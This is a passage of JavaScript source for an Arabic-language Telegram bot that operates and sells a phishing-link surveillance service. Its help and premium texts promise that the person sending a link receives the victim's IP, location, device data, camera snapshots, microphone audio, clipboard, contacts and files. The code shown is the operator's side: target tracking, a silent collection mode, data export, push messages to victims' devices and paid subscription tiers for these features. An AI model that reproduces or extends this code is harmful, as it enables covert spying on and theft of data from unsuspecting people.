    const up = Math.floor(process.uptime()), h = Math.floor(up/3600), m = Math.floor((up%3600)/60);
    const now = new Date().toJSON().slice(0,19).replace('T',' ');
    const topUsers = Object.entries(userStats)
      .sort((a,b)=>(b[1].linksOpened||0)-(a[1].linksOpened||0)).slice(0,3)
      .map(([id,u],i)=>{ const p=profiles[id]||{}; return `${['🥇','🥈','🥉'][i]} ${p.name||id}: ${u.linksOpened||0} فتحة`; }).join("\n");
    const targetsList = [...targets].map(id=>{ const p=profiles[String(id)]||{}; return `🎯 ${p.name||id}`; }).join(", ")||"لا يوجد";
    return bot.sendMessage(chatId,
      `📋 تقرير شامل\n🕒 ${now} UTC\n━━━━━━━━━━━━━━━\n👥 المستخدمون: ${users.size}\n🎯 الأهداف: ${targetsList}\n🚫 المحجوبون: ${banned.size}\n━━━━━━━━━━━━━━━\n🔗 روابط منشأة: ${stats.linksCreated}\n👁️ روابط مفتوحة: ${stats.linksOpened}\n📷 صور: ${stats.camsnaps}  🎙️ صوت: ${stats.audios}  📍 مواقع: ${stats.locations}\n━━━━━━━━━━━━━━━\n🏆 الأكثر نشاطاً:\n${topUsers||'لا يوجد بيانات'}\n━━━━━━━━━━━━━━━\n⏱️ التشغيل: ${h}س ${m}د`
    );
  }

  if (msg.text === "/clearstats") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    stats = { linksOpened:0, linksCreated:0, camsnaps:0, audios:0, locations:0 }; saveStats();
    return bot.sendMessage(chatId, `🗑️ تم مسح جميع الإحصائيات.`);
  }

  if (msg.text === "/users") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    if (users.size === 0) return bot.sendMessage(chatId, "لا يوجد مستخدمون.");
    const list = [...users].map((id,i) => {
      const p = profiles[String(id)] || {};
      const name = p.name ? ` — ${mdEsc(p.name)}` : '';
      const uname = p.username ? ` ${mdEsc(p.username)}` : '';
      const flags = `${targets.has(id)?' 🎯':''}${banned.has(id)?' 🚫':''}`;
      return `${i+1}\\. \`${id}\`${name}${uname}${flags}`;
    }).join("\n");
    return bot.sendMessage(chatId, `👥 المستخدمون \\(${users.size}\\):\n\n${list}`, { parse_mode: "MarkdownV2" });
  }

  if (msg.text === "/banned") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    if (banned.size === 0) return bot.sendMessage(chatId, "✅ لا يوجد محجوبون.");
    const list = [...banned].map((id,i) => `${i+1}. \`${id}\``).join("\n");
    return bot.sendMessage(chatId, `🚫 المحجوبون (${banned.size}):\n\n${list}`, { parse_mode: "Markdown" });
  }

  if (msg.text?.startsWith("/ban ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = parseInt(msg.text.replace("/ban ","").trim());
    if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ ID غير صحيح.");
    banned.add(id); saveBanned();
    return bot.sendMessage(chatId, `🚫 تم حجب \`${id}\`.`, { parse_mode: "Markdown" });
  }

  if (msg.text?.startsWith("/unban ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = parseInt(msg.text.replace("/unban ","").trim());
    if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ ID غير صحيح.");
    banned.delete(id); saveBanned();
    return bot.sendMessage(chatId, `✅ رُفع الحجب عن \`${id}\`.`, { parse_mode: "Markdown" });
  }

  if (msg.text?.startsWith("/deleteuser ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = parseInt(msg.text.replace("/deleteuser ","").trim());
    if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ ID غير صحيح.");
    users.delete(id); targets.delete(id); saveUsers(); saveTargets();
    return bot.sendMessage(chatId, `🗑️ تم حذف \`${id}\`.`, { parse_mode: "Markdown" });
  }

  if (msg.text === "/clearusers") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const c = users.size; users.clear(); saveUsers();
    return bot.sendMessage(chatId, `🗑️ تم مسح ${c} مستخدم.`);
  }

  if (msg.text === "/export") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    if (users.size === 0) return bot.sendMessage(chatId, "لا يوجد مستخدمون.");
    const lines = [...users].map((id,i) => {
      const p  = profiles[String(id)] || {};
      const us = userStats[String(id)] || { linksCreated:0, linksOpened:0 };
      const flags = [targets.has(id)?'هدف':'', banned.has(id)?'محجوب':''].filter(Boolean).join('،') || 'عادي';
      return `${i+1}. ID: ${id} | ${p.name||'مجهول'} | ${p.username||''} | ${flags} | روابط: ${us.linksCreated} | فتحات: ${us.linksOpened} | آخر ظهور: ${p.seen||'غير معروف'}`;
    });
    const content = `📋 تصدير بيانات البوت\nالتاريخ: ${new Date().toISOString()}\nإجمالي المستخدمين: ${users.size}\nالأهداف: ${targets.size} | المحجوبون: ${banned.size}\n${'─'.repeat(60)}\n` + lines.join("\n");
    return bot.sendDocument(chatId, Buffer.from(content,'utf8'), { caption:`📤 تصدير شامل (${users.size} مستخدم)` }, { filename:`export_${new Date().toJSON().slice(0,10)}.txt`, contentType:"text/plain" });
  }

  // /info [id] — detailed user info
  if (msg.text?.startsWith("/info")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = parseInt(msg.text.replace("/info","").trim());
    if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ استخدم: /info [ID]");
    const us  = userStats[String(id)] || { linksCreated:0, linksOpened:0 };
    const pro = profiles[String(id)] || {};
    const userNotes = (notes[String(id)] || []);
    const notesText = userNotes.length ? userNotes.map((n,i)=>`${i+1}. ${mdEsc(n)}`).join("\n") : "لا توجد";
    return bot.sendMessage(chatId,
      `👤 معلومات المستخدم: \`${id}\`\n` +
      (pro.name     ? `📛 الاسم: ${mdEsc(pro.name)}\n` : '') +
      (pro.username ? `🔗 يوزر: ${mdEsc(pro.username)}\n` : '') +
      (pro.seen     ? `🕐 آخر ظهور: ${mdEsc(pro.seen)} UTC\n` : '') +
      `\n📋 في القائمة: ${users.has(id) ? '✅' : '❌'}\n` +
      `🎯 هدف: ${targets.has(id) ? '✅' : '❌'}\n` +
      `🚫 محجوب: ${banned.has(id) ? '✅' : '❌'}\n\n` +
      `🔗 روابط أنشأها: ${us.linksCreated}\n` +
      `👁️ مرات فتح روابطه: ${us.linksOpened}\n\n` +
      `📝 الملاحظات:\n${notesText}`,
      { parse_mode: "MarkdownV2" }
    );
  }

  // /note [id] [نص] — add note about user
  if (msg.text?.startsWith("/note ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const parts = msg.text.replace("/note ","").split(" ");
    const id = parts[0];
    const noteText = parts.slice(1).join(" ");
    if (!id || !noteText) return bot.sendMessage(chatId, "⚠️ استخدم: /note [ID] [النص]");
    if (!notes[id]) notes[id] = [];
    notes[id].push(`${noteText} (${new Date().toJSON().slice(0,10)})`);
    saveNotes();
    return bot.sendMessage(chatId, `📝 تم إضافة ملاحظة على \`${id}\`.`, { parse_mode: "Markdown" });
  }

  // /notes [id] — view notes
  if (msg.text?.startsWith("/notes ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = msg.text.replace("/notes ","").trim();
    const userNotes = notes[id] || [];
    if (userNotes.length === 0) return bot.sendMessage(chatId, "لا توجد ملاحظات.");
    return bot.sendMessage(chatId, `📝 ملاحظات \`${id}\`:\n\n${userNotes.map((n,i)=>`${i+1}. ${n}`).join("\n")}`, { parse_mode: "Markdown" });
  }

  // /delnotes [id] — delete notes
  if (msg.text?.startsWith("/delnotes ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = msg.text.replace("/delnotes ","").trim();
    delete notes[id]; saveNotes();
    return bot.sendMessage(chatId, `🗑️ تم حذف ملاحظات \`${id}\`.`, { parse_mode: "Markdown" });
  }

  if (msg.text === "/silent") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    settings.silentMode = !settings.silentMode; saveSettings();
    return bot.sendMessage(chatId, settings.silentMode ? "🔕 الوضع الصامت مفعّل\nالبيانات تُجمع بصمت." : "🔔 الوضع الصامت معطّل.");
  }

  // /away [message] — away mode with auto-reply
  if (msg.text?.startsWith("/away")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const awayText = msg.text.replace("/away","").trim();
    if (!awayText) return bot.sendMessage(chatId, "⚠️ استخدم: /away [الرسالة التلقائية]");
    settings.awayMode = true; settings.awayMsg = awayText; saveSettings();
    return bot.sendMessage(chatId, `🌙 وضع الغياب مفعّل\nرسالة الرد التلقائي:\n\n"${awayText}"`);
  }

  if (msg.text === "/awayoff") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    settings.awayMode = false; settings.awayMsg = ""; saveSettings();
    return bot.sendMessage(chatId, "✅ تم إيقاف وضع الغياب.");
  }

  if (msg.text?.startsWith("/addtarget ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = parseInt(msg.text.replace("/addtarget ","").trim());
    if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ أدخل ID صحيح.");
    targets.add(id); saveTargets();
    return bot.sendMessage(chatId, `🎯 تم إضافة \`${id}\` كهدف.\nستحصل على تنبيه خاص عند كل نشاطه.`, { parse_mode: "Markdown" });
  }

  if (msg.text?.startsWith("/removetarget ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = parseInt(msg.text.replace("/removetarget ","").trim());
    if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ أدخل ID صحيح.");
    targets.delete(id); saveTargets();
    return bot.sendMessage(chatId, `✅ تم إزالة \`${id}\` من الأهداف.`, { parse_mode: "Markdown" });
  }

  if (msg.text === "/targets") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    if (targets.size === 0) return bot.sendMessage(chatId, "لا يوجد أهداف.");
    return bot.sendMessage(chatId, `🎯 الأهداف (${targets.size}):\n\n${[...targets].map((id,i)=>`${i+1}. \`${id}\``).join("\n")}`, { parse_mode: "Markdown" });
  }

  if (msg.text?.startsWith("/schedule")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const arg = msg.text.replace("/schedule","").trim();
    if (!arg) return bot.sendMessage(chatId, `📅 التقرير التلقائي: ${settings.scheduleHour>=0?settings.scheduleHour+':00 UTC':'معطّل'}\n\n/schedule [0-23] لضبطه\n/schedule off لإيقافه`);
    if (arg === "off") { settings.scheduleHour=-1; saveSettings(); return bot.sendMessage(chatId,"✅ تم إيقاف التقرير التلقائي."); }
    const h = parseInt(arg);
    if (isNaN(h)||h<0||h>23) return bot.sendMessage(chatId,"⚠️ أدخل ساعة 0-23 (UTC).");
    settings.scheduleHour=h; saveSettings();
    return bot.sendMessage(chatId,`✅ سيُرسل تقرير يومي كل ${h}:00 UTC`);
  }

  if (msg.text?.startsWith("/link ")) return createLink(chatId, msg.text.replace("/link ","").trim());

  if (msg.text?.startsWith("/push ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const parts = msg.text.replace("/push ","").trim().split(" ");
    const pUid  = parts.shift();
    const pText = parts.join(" ").trim();
    if (!pUid || !pText) return bot.sendMessage(chatId, "الاستخدام: /push [uid] [النص]");
    if (!pushSubs[pUid]) return bot.sendMessage(chatId, "❌ هذا الجهاز لم يفعّل الإشعارات بعد.");
    sendPushToDevice(pUid, "🔔 رسالة جديدة", pText);
    return bot.sendMessage(chatId, `✅ تم إرسال الإشعار — سيظهر على جهاز الضحية خلال 3 دقائق كحد أقصى`);
  }

  if (msg.text === "/ping") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const s=Date.now(); const m=await bot.sendMessage(chatId,"🏓 Pong!");
    return bot.editMessageText(`🏓 Pong! \`${Date.now()-s}ms\``,{chat_id:chatId,message_id:m.message_id,parse_mode:"Markdown"});
  }

  if (msg.text?.startsWith("/setwelcome ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    settings.welcomeMsg=msg.text.replace("/setwelcome ","").trim(); saveSettings();
    return bot.sendMessage(chatId,"✅ تم تحديث رسالة الترحيب.");
  }

  if (msg.text === "/resetwelcome") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    settings.welcomeMsg=""; saveSettings();
    return bot.sendMessage(chatId,"✅ تمت الإعادة للافتراضي.");
  }

  // ── Feature control ───────────────────────────────────────────────────────
  if (msg.text === "/features") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    return sendFeaturesMenu(chatId);
  }

  if (msg.text === "/premiumconfig") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    return bot.sendMessage(chatId, premiumConfigText(), { parse_mode:"Markdown", reply_markup: buildPremiumConfigKeyboard() });
  }

  // /lastopen — آخر فتح لكل مستخدم
  if (msg.text === "/lastopen") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const list = Object.entries(userStats)
      .filter(([,u]) => u.lastOpen)
      .sort((a,b) => (b[1].lastOpen||'').localeCompare(a[1].lastOpen||''))
      .slice(0,20)
      .map(([id,u],i) => {
        const p = profiles[id]||{};
        return `${i+1}. ${p.name||id} — ${u.lastOpen} UTC (${u.linksOpened||0}x)`;
      }).join("\n");
    return bot.sendMessage(chatId, list ? `🕐 آخر فتح للروابط:\n\n${list}` : "لا توجد بيانات بعد.");
  }

  // /top — الأكثر نشاطاً
  if (msg.text === "/top") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const sorted = Object.entries(userStats)
      .sort((a,b)=>(b[1].linksOpened||0)-(a[1].linksOpened||0)).slice(0,10);
    if (!sorted.length) return bot.sendMessage(chatId, "لا توجد بيانات.");
    const medals = ['🥇','🥈','🥉'];
    const list = sorted.map(([id,u],i) => {
      const p = profiles[id]||{};
      const medal = medals[i]||`${i+1}.`;
      return `${medal} ${p.name||id}${p.username?' '+p.username:''}\n   👁️ ${u.linksOpened||0} فتحة | 🔗 ${u.linksCreated||0} رابط`;
    }).join("\n");
    return bot.sendMessage(chatId, `🏆 الأكثر نشاطاً (${sorted.length}):\n\n${list}`);
  }

  // ── Premium commands ────────────────────────────────────────────────────────

  // /mypremium — check own subscription status
  if (msg.text === "/mypremium") {
    const id = String(chatId);
    if (isPremium(chatId) && chatId !== BOT_OWNER) {
      const p = premium[id];
      const expText = p.expiry === -1 ? "♾️ مدى الحياة" : `⏳ ينتهي: ${new Date(p.expiry).toJSON().slice(0,10)}`;
      return bot.sendMessage(chatId, `✅ اشتراكك *مفعّل*\n📦 الخطة: ${p.plan||'—'}\n${expText}\n\n🎁 المميزات: 📷 كاميرا + 🎙️ صوت + 📋 حافظة`, { parse_mode:"Markdown" });
    }
    if (chatId === BOT_OWNER) return bot.sendMessage(chatId, `👑 أنت المالك — كل الميزات متاحة دائماً.`);
    return bot.sendMessage(chatId, `❌ ليس لديك اشتراك مدفوع.\n\nتواصل مع المالك لتفعيل البريميوم وتحصل على:\n📷 كاميرا أمامية وخلفية\n🎙️ تسجيل صوتي\n📋 قراءة الحافظة`);
  }

  // /premium [id] [days|lifetime] — grant premium (owner only)
  if (msg.text?.startsWith("/premium ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const parts = msg.text.replace("/premium ","").trim().split(/\s+/);
    const tid = parts[0]; const daysArg = parts[1] || "30";
    if (!tid || isNaN(Number(tid))) return bot.sendMessage(chatId, "⚠️ استخدم: /premium [ID] [أيام أو lifetime]");
    let expiry, plan;
    if (daysArg === "lifetime" || daysArg === "مدى") { expiry = -1; plan = "lifetime"; }
    else { const d = parseInt(daysArg)||30; expiry = Date.now() + d*24*3600*1000; plan = d >= 365 ? "yearly" : d >= 30 ? "monthly" : "weekly"; }
    premium[tid] = { expiry, plan, grantedAt: Date.now(), expired: false };
    savePremium();
    backupFileToGH(PREMIUM_FILE, '_data/premium.json');
    const prof = profiles[tid] || {};
    const expText = expiry === -1 ? "♾️ مدى الحياة" : `⏳ حتى ${new Date(expiry).toJSON().slice(0,10)}`;
    bot.sendMessage(chatId, `✅ تم تفعيل البريميوم\n👤 ${prof.name||tid}\n📦 ${plan}\n${expText}`, { parse_mode:"Markdown" });
    // Notify the user
    bot.sendMessage(Number(tid), `🎉 تم تفعيل اشتراكك البريميوم!\n📦 الخطة: ${plan}\n${expText}\n\n🔓 المميزات المفعّلة:\n📷 كاميرا أمامية وخلفية\n🎙️ تسجيل صوتي\n📋 قراءة الحافظة`).catch(()=>{});
    return;
  }

  // /revokepremium [id] — revoke premium (owner only)
  if (msg.text?.startsWith("/revokepremium ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const tid = msg.text.replace("/revokepremium ","").trim();
    if (!premium[tid]) return bot.sendMessage(chatId, `⚠️ \`${tid}\` ليس لديه اشتراك.`, { parse_mode:"Markdown" });
    delete premium[tid]; savePremium();
    backupFileToGH(PREMIUM_FILE, '_data/premium.json');
    bot.sendMessage(chatId, `🗑️ تم إلغاء اشتراك \`${tid}\`.`, { parse_mode:"Markdown" });
    bot.sendMessage(Number(tid), `⚠️ تم إلغاء اشتراكك البريميوم.\nتواصل مع المالك لتجديده.`).catch(()=>{});
    return;
  }

  // /premiumlist — list all premium subscribers (owner only)
  if (msg.text === "/premiumlist") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const entries = Object.entries(premium);
    if (!entries.length) return bot.sendMessage(chatId, "لا يوجد مشتركون بريميوم.");
    const now = Date.now();
    const list = entries.map(([id, p], i) => {
      const prof = profiles[id] || {};
      const active = isPremium(Number(id));
      const expText = p.expiry === -1 ? "♾️" : new Date(p.expiry).toJSON().slice(0,10);
      return `${i+1}. ${active?'✅':'❌'} ${prof.name||id} (${p.plan||'?'}) — ${expText}`;
    }).join("\n");
    return bot.sendMessage(chatId, `💎 المشتركون البريميوم (${entries.length}):\n\n${list}`);
  }

  // /cleardata [id] — مسح بيانات مستخدم معين
  if (msg.text?.startsWith("/cleardata")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = msg.text.replace("/cleardata","").trim();
    if (!id) return bot.sendMessage(chatId, "⚠️ استخدم: /cleardata [ID]");
    delete userStats[id]; saveUserStats();
    delete profiles[id];  saveProfiles();
    delete notes[id];     saveNotes();
    return bot.sendMessage(chatId, `🗑️ تم مسح بيانات \`${id}\` (إحصائيات + ملف شخصي + ملاحظات)`, { parse_mode:"Markdown" });
  }

  // /search [نص] — ابحث عن مستخدم باسمه أو يوزرنيمه
  if (msg.text?.startsWith("/search")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const q = msg.text.replace("/search","").trim().toLowerCase();
    if (!q) return bot.sendMessage(chatId, "⚠️ استخدم: /search [الاسم أو @اليوزرنيم]");
    const found = Object.entries(profiles).filter(([id, p]) => {
      return (p.name && p.name.toLowerCase().includes(q)) ||
             (p.username && p.username.toLowerCase().includes(q));
    });
    if (!found.length) return bot.sendMessage(chatId, `🔍 لا نتائج لـ "${q}"`);
    const list = found.map(([id, p]) => {
      const flags = `${targets.has(Number(id))?' 🎯':''}${banned.has(Number(id))?' 🚫':''}`;
      return `• \`${id}\` — ${mdEsc(p.name||'مجهول')} ${mdEsc(p.username||'')}${flags}\n  آخر ظهور: ${mdEsc(p.seen||'—')}`;
    }).join("\n");
    return bot.sendMessage(chatId, `🔍 نتائج البحث \\(${found.length}\\):\n\n${list}`, { parse_mode:"MarkdownV2" });
  }
});

// ── Callback Queries ──────────────────────────────────────────────────────────

bot.on('callback_query', async (q) => {
  bot.answerCallbackQuery(q.id);
  const chatId = q.message.chat.id;
  const data   = q.data;

  if (data === "crenew")  return createNew(chatId);
  if (data === "myid")    return bot.sendMessage(chatId,`🆔 الـ ID:\n\`${chatId}\``,{parse_mode:"Markdown"});
  if (data === "mystats") {
    const us = userStats[String(chatId)] || { linksCreated:0, linksOpened:0 };
    return bot.sendMessage(chatId,`📊 إحصائياتك:\n\n🔗 الروابط التي أنشأتها: ${us.linksCreated}\n👁️ مرات فتح روابطك: ${us.linksOpened}`);
  }
  if (data === "help") {
    return bot.sendMessage(chatId,
      `📖 الاستخدام:\n\n1️⃣ أنشئ رابطاً\n2️⃣ أرسله للضحية\n\n📥 يصلك:\n   ⚡ IP + ISP + الدولة\n   📱 بيانات الجهاز\n   📷 كاميرا أمامية + خلفية\n   📍 GPS أو IP\n   🎙️ تسجيل صوتي\n   📋 محتوى الحافظة\n   🌐 نوع الاتصال والسرعة\n\n📊 /mystats — إحصائياتك\n\n⚡ Powered by @Ye_x00`
    );
  }
  if (data.startsWith("reply:"))
    return bot.sendMessage(chatId,`${REPLY_PREFIX}${data.replace("reply:","")}\n\nاكتب ردك:`,{reply_markup:JSON.stringify({force_reply:true})});

  // ── Premium info (all users) ───────────────────────────────────────────────
  if (data === "pinfo") {
    const hasPrem = isPremium(chatId);
    const camFree = isPremiumFeatureFree('camera');
    const camLine = camFree ? `✅  📷 الكاميرا — مفعّلة مجاناً الآن!` : `✅  📷 الكاميرا — مجانًا لنصف يوم كل فترة 🎁`;
    const statusLine = hasPrem
      ? `\n\n✨ أنت مشترك بريميوم — كل الميزات مفعّلة!`
      : `\n\n💬 للاشتراك تواصل مع @Ye_x00`;
    return bot.sendMessage(chatId,
      `💎 خطط البريميوم\n\n` +
      `━━━━━━ مجاني للجميع ━━━━━━\n\n` +
      `✅  📍 الموقع الجغرافي (GPS + IP)\n` +
      `✅  📱 بيانات الجهاز الكاملة\n` +
      `✅  🌐 معلومات الشبكة (ISP، الدولة، السرعة)\n` +
      `${camLine}\n\n` +
      `━━━━━ حصرياً للمشتركين ━━━━━\n\n` +
      `🔒  📷 كاميرا أمامية + خلفية (دائم وبلا انقطاع)\n` +
      `🔒  🎙️ تسجيل صوتي من الميكروفون\n` +
      `🔒  📋 قراءة محتوى الحافظة (أرقام، نصوص)\n` +
      `🔒  📒 سرقة جهات الاتصال كاملة\n` +
      `🔒  🖼️ تحميل الصور والملفات من جهاز الضحية\n\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `🚀 كل هذا برابط واحد يُرسَل للضحية!` +
      statusLine
    );
  }

  // ── Premium admin panel (owner only) ──────────────────────────────────────
  if (data === "premadmin" && q.from.id === BOT_OWNER) {
    const total = Object.keys(premium).length;
    const active = Object.entries(premium).filter(([id]) => isPremium(Number(id))).length;
    return bot.sendMessage(chatId,
      `👑 إدارة البريميوم\n\n` +
      `💎 المشتركون: ${active} نشط / ${total} إجمالي\n\n` +
      `الأوامر النصية:\n` +
      `• /premium [ID] [أيام] — تفعيل\n` +
      `• /premium [ID] lifetime — مدى الحياة\n` +
      `• /revokepremium [ID] — إلغاء`,
      { reply_markup: JSON.stringify({ inline_keyboard: [
        [{ text: "➕ تفعيل بريميوم", callback_data: "premgrant" }, { text: "🗑️ إلغاء بريميوم", callback_data: "premrevoke" }],
        [{ text: "📋 قائمة المشتركين", callback_data: "premlist" }],
        [{ text: "🎛️ إعدادات الميزات المجانية", callback_data: "gopc" }]
      ] }) }
    );
  }

  if (data === "premlist" && q.from.id === BOT_OWNER) {
    const entries = Object.entries(premium);
    if (!entries.length) return bot.sendMessage(chatId, "لا يوجد مشتركون بريميوم حالياً.");
    const list = entries.map(([id, p], i) => {
      const prof = profiles[id] || {};
      const active = isPremium(Number(id));
      const expText = p.expiry === -1 ? "♾️ مدى الحياة" : new Date(p.expiry).toJSON().slice(0,10);
      return `${i+1}. ${active?'✅':'❌'} ${prof.name||id} (${p.plan||'?'}) — ${expText}`;
    }).join("\n");
    return bot.sendMessage(chatId, `💎 المشتركون (${entries.length}):\n\n${list}`);
  }

  if (data === "premgrant" && q.from.id === BOT_OWNER) {
    return bot.sendMessage(chatId, PREM_GRANT_PREFIX, { reply_markup: JSON.stringify({ force_reply: true }) });
  }

  if (data === "premrevoke" && q.from.id === BOT_OWNER) {
    return bot.sendMessage(chatId, PREM_REVOKE_PREFIX, { reply_markup: JSON.stringify({ force_reply: true }) });
  }

  if (data === "gopc" && q.from.id === BOT_OWNER) {
    return bot.sendMessage(chatId, premiumConfigText(), {
      parse_mode: "Markdown",
      reply_markup: buildPremiumConfigKeyboard()
    });
  }

  // ── Feature buttons ────────────────────────────────────────────────────────
  // ── Premium Config buttons ──────────────────────────────────────────────────
  if (data.startsWith("pc:") && q.from.id === BOT_OWNER) {
    const msgId = q.message.message_id;
    if (data.startsWith("pc:t:")) {
      const k = data.replace("pc:t:","");
      if (k in PREM_FEAT_NAMES) {
        settings.premiumFree[k] = !settings.premiumFree[k];
        if (!settings.premiumFree[k]) settings.premiumFreeExpiry[k] = null;
        saveSettings();
        backupFileToGH(SETTINGS_FILE, '_data/settings.json');
      }
    } else if (data.startsWith("pc:timer:")) {
      const mins = parseInt(data.replace("pc:timer:",""));
      const exp  = Date.now() + mins * 60 * 1000;
      Object.keys(PREM_FEAT_NAMES).forEach(k => {
        settings.premiumFree[k]        = true;
        settings.premiumFreeExpiry[k]  = exp;
      });
      saveSettings();
      backupFileToGH(SETTINGS_FILE, '_data/settings.json');
    } else if (data === "pc:allpaid") {
      Object.keys(PREM_FEAT_NAMES).forEach(k => {
        settings.premiumFree[k]       = false;
        settings.premiumFreeExpiry[k] = null;
      });
      saveSettings();
      backupFileToGH(SETTINGS_FILE, '_data/settings.json');
    }
    return bot.editMessageText(premiumConfigText(), {
      chat_id: chatId, message_id: msgId,
      parse_mode: "Markdown",
      reply_markup: buildPremiumConfigKeyboard()
    }).catch(() => {});
  }

  if (data.startsWith("ft:") && q.from.id === BOT_OWNER) {
    const msgId = q.message.message_id;
    if (data.startsWith("ft:t:")) {
      const k = data.replace("ft:t:","");
      if (k in settings.features) { settings.features[k] = !settings.features[k]; saveSettings(); }
    } else if (data === "ft:allon") {
      Object.keys(settings.features).forEach(k => settings.features[k]=true); saveSettings();
    } else if (data === "ft:alloff") {
      Object.keys(settings.features).forEach(k => settings.features[k]=false);
      settings.featureExpiry = null; saveSettings();
    } else if (data.startsWith("ft:timer:")) {
      const mins = parseInt(data.replace("ft:timer:",""));
      Object.keys(settings.features).forEach(k => settings.features[k]=true);
      settings.featureExpiry = Date.now() + mins*60*1000; saveSettings();
    } else if (data === "ft:timeroff") {
      settings.featureExpiry = null; saveSettings();
    }
    return editFeaturesMenu(chatId, msgId);
  }

  if (data.startsWith("qr:")) {
    const uid = data.replace("qr:","").trim();
    const link = lastLink.get(uid) || lastLink.get(String(chatId));
    if (!link) return bot.sendMessage(chatId, "❌ لا يوجد رابط محفوظ. أنشئ رابطاً أولاً.");
    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=${encodeURIComponent(link)}`;
    return bot.sendPhoto(chatId, qrUrl, { caption: `📷 QR Code\n\n${link}` }).catch(() => {
      bot.sendMessage(chatId, `📷 QR: ${qrUrl}`);
    });
  }
});

bot.on('polling_error', () => {});

// ── Features Menu Builder ─────────────────────────────────────────────────────
const FEAT_NAMES = {
  gyroscope:   "🌀 جيروسكوب",
  webrtc:      "🌐 WebRTC IP",
  fingerprint: "🖥️ بصمة الجهاز",
  sessionTime: "⏱️ وقت الجلسة",
  lightSensor: "💡 مستشعر الضوء",
  clipboard:   "📋 الحافظة"
};

// ── Premium Config Menu ───────────────────────────────────────────────────────
const PREM_FEAT_NAMES = {
  camera:    "📷 الكاميرا",
  audio:     "🎤 الصوت",
  clipboard: "📋 الحافظة",
  contacts:  "📒 جهات الاتصال",
  files:     "🖼️ الصور/الملفات"
};

function premiumConfigText() {
  const lines = Object.entries(PREM_FEAT_NAMES).map(([k, name]) => {
    const isFree = isPremiumFeatureFree(k);
    const exp    = settings.premiumFreeExpiry?.[k];
    const expStr = exp ? ` (حتى ${new Date(exp).toJSON().slice(11,16)} UTC)` : '';
    return `${isFree ? '🟢 مجاني' : '🔴 مدفوع'} ${name}${expStr}`;
  });
  return `💎 *إعدادات الميزات المدفوعة*\n\nاضغط على الميزة لتبديلها بين مجاني ومدفوع:\n\n${lines.join('\n')}`;
}

function buildPremiumConfigKeyboard() {
  const rows = Object.entries(PREM_FEAT_NAMES).map(([k, name]) => {
    const isFree = isPremiumFeatureFree(k);
    return [{ text: `${isFree ? '🟢' : '🔴'} ${name}`, callback_data: `pc:t:${k}` }];
  });
  rows.push([
    { text: "⏱️ 15د مجاني للكل",  callback_data: "pc:timer:15" },
    { text: "⏱️ 60د مجاني للكل",  callback_data: "pc:timer:60" }
  ]);
  rows.push([{ text: "🔴 مدفوع للكل", callback_data: "pc:allpaid" }]);
  return JSON.stringify({ inline_keyboard: rows });
}

function buildFeaturesKeyboard() {
  const rows = Object.entries(settings.features).map(([k, v]) => ([{
    text: `${v ? '🟢' : '🔴'} ${FEAT_NAMES[k] || k}`,
    callback_data: `ft:t:${k}`
  }]));
  rows.push([
    { text: "🟢 تشغيل الكل",  callback_data: "ft:allon"  },
